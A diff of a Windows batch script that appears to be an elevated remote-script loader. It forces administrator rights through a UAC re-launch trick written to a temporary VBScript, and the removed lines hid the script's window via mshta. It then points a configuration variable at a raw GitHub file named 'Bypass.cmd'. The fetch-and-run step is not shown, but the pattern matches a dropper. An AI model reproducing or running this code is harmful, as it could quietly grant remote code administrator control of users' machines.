@@ -1,22 +1,29 @@
 @echo off
 setlocal
 
-:: Admin check with UAC elevation
-NET SESSION >nul 2>&1
-if %errorlevel% neq 0 (
+:: BatchGotAdmin
+:-------------------------------------
+if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) else (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
+if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
-    set "params=%*"
-    set "params=%params:"=\"%"
-    set "params=%params:'=\"'%"
-    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~s0\" %params%' -Verb RunAs"
-    exit /b
-)
+    goto UACPrompt
+) else ( goto gotAdmin )
 
-:: Hide window
-if not "%1"=="hidden" (
-    mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c """"%~f0"" hidden"", 0, false"^)
-    exit /b
-)
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0" 
 
 :: Configuration
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/master/Bypass.cmd"
